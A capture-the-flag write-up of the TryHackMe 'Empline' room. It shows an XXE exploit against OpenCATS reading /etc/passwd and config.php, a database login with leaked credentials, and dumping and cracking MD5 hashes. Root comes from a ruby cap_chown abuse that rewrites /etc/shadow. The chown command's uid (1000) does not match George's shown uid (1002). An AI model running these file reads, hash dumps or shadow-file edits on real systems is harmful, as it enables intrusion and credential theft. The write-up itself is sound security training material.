This is a writeup on the TryHackMe box, [Empline](https://tryhackme.com/room/empline)

# Enumeration
## Port scanning
After the box is up, we start with nmap:

```nmap -sC -sV -Pn 10.10.142.249```

This command scans the top 1000 ports. We get the following result:

```
Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-27 02:03 EST
Nmap scan report for 10.10.142.249
Host is up (0.27s latency).
Not shown: 993 closed ports
PORT     STATE    SERVICE        VERSION
22/tcp   open     ssh            OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c0:d5:41:ee:a4:d0:83:0c:97:0d:75:cc:7b:10:7f:76 (RSA)
|   256 83:82:f9:69:19:7d:0d:5c:53:65:d5:54:f6:45:db:74 (ECDSA)
|_  256 4f:91:3e:8b:69:69:09:70:0e:82:26:28:5c:84:71:c9 (ED25519)
80/tcp   open     http           Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Empline
1301/tcp filtered ci3-software-1
1443/tcp filtered ies-lm
2065/tcp filtered dlsrpn
2190/tcp filtered tivoconnect
3306/tcp open     mysql          MySQL 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
|   Thread ID: 51
|   Capabilities flags: 63487
|   Some Capabilities: Support41Auth, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, IgnoreSigpipes, LongColumnFlag, FoundRows, Support
sCompression, LongPassword, IgnoreSpaceBeforeParenthesis, ODBCClient, Speaks41ProtocolNew, SupportsTransactions, InteractiveClient, Speaks41P
rotocolOld, ConnectWithDatabase, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: uLWRskCH#s<n8k5aku,v
|_  Auth Plugin Name: mysql_native_password
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.24 seconds

```

Most interesting ports here are port 80 for http and port 3306 for mysql.
## Web
Heading to the website, we see the following page.
![[Pasted image 20211227045656.png]]

Most of the website is not very intersting, however, we do find an interesting link: `job.empline.thm/careers`. 

We add the following line to `/etc/hosts` 
```
10.10.142.249   empline.thm job.empline.thm
```

and head to `job.empline.thm/careers`

![[Pasted image 20211227050127.png]]

Digging around `job.empline.thm`, we see it's running version 0.9.4 of [opencats](https://www.opencats.org/).
![[Pasted image 20211227050421.png]]

After some googling, we find there's potentially an xxe vulnerability([official notice](https://www.opencats.org/news/2019/july/), [more reading](https://doddsecurity.com/312/xml-external-entity-injection-xxe-in-opencats-applicant-tracking-system/)). 

# Foothold
We find the existing [exploit](https://www.exploit-db.com/exploits/50316) on exploitdb. Using the `/etc/passwd` file(`python3 50316.py --url job.empline.thm --file /etc/passwd`), we verify the the website is indeed vulnerable to xxe. Additionally, in the `/etc/passwd` file, we notice an interesting user `george`. 
```
george:x:1002:1002::/home/george:/bin/bash
```
`george` is the only user other than `root` that has a shell. We'll likely escalate to `george` at some point.

Digging around the github repo for opencats, we find the database credentials are likely stored in the `config.php` file([github](https://github.com/opencats/OpenCATS/blob/master/config.php)). Using the same exploit on `config.php`, we find potential database credentials.
```
python3 50316.py --url job.empline.thm --file config.php
```
```
/* Database configuration. */
define('DATABASE_USER', 'james');
define('DATABASE_PASS', '[omitted]');
define('DATABASE_HOST', 'localhost');
define('DATABASE_NAME', 'opencats');
```

Earlier from nmap, we found the mysql port is also open. We can connect to their database from our kali box
`mysql --host=10.10.142.249 --user=james --password=[omitted]`

After digging around, we find some password hashes in the `opencats` database under the `user` table.

```
MariaDB [opencats]> select user_name, password from user;
+----------------+----------------------------------+
| user_name      | password                         |
+----------------+----------------------------------+
| admin          | b67b5ecc5d8902ba59c65596e4c053ec |
| cats@rootadmin | cantlogin                        |
| george         | [omitted]                        |
| james          | [omitted]                        |
+----------------+----------------------------------+
```

After some quick search in their github repo, we find these are md5 hashes with no salt([lib/Users.php](https://github.com/opencats/OpenCATS/blob/2764566bcb37ebde9e87f9106e9defed3d7d7c0c/lib/Users.php#L679)).

Using a rainbow table online, we can crack the hash to find the password for the user `george`. 

![[Pasted image 20211227053840.png]]

# PrivEsc
After ssh-ing into the the machine as `george`, we find the `user.txt` file under `/home/george`.
```
george@empline:/tmp$ ls -al /home/george
total 32
drwxrwx--- 5 george george 4096 Dec 27 10:39 .
drwxr-xr-x 4 root   root   4096 Jul 20 19:48 ..
-rw------- 1 george george  252 Dec 27 10:39 .bash_history
drwx------ 2 george george 4096 Dec 27 08:25 .cache
drwxr-x--- 3 george george 4096 Dec 27 08:27 .config
drwx------ 3 george george 4096 Dec 27 08:27 .gnupg
-rw------- 1 george george 1019 Dec 27 08:37 .viminfo
-rw-r--r-- 1 root   root     33 Jul 20 19:48 user.txt
```

Using [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) to enumerate, we fin the following misconfiguration on `ruby`:
```
Files with capabilities (limited to 50):
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/local/bin/ruby = cap_chown+ep
```
In this case, `ruby` is given the permission to change the ownership of any file([more reading](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#cap_chown)). We can abuse this by changing the owner of `/etc/shadow` to `george` and modifying the root password.
First we need the numeric id of `george`:
```
george@empline:/tmp$ id
uid=1002(george) gid=1002(george) groups=1002(george)
```

Then we can do `ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'` to change ownership or `/etc/shadow`.

To change root's password, we can simple do `mkpasswd pass` to generate the hash of the password `pass` and modify `/etc/shadow` to use our new hash.
```
root:BbbQ1kZ5muW8.:18828:0:99999:7:::
```

Using the password we set earlier, we `su root` to get a shell as the root user.
At last, we find `root.txt` under `/root`
```
root@empline:/tmp# ls -al /root
total 36
drwx------  4 root root 4096 Jul 20 19:52 .
drwxr-xr-x 24 root root 4096 Dec 27 07:02 ..
-rw-------  1 root root   57 Dec 27 10:39 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwxr-xr-x  3 root root 4096 Jul 20 19:49 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Jul 20 19:45 .ssh
-rw-r--r--  1 root root  227 Jul 20 19:48 .wget-hsts
-rw-r--r--  1 root root   33 Jul 20 19:48 root.txt
```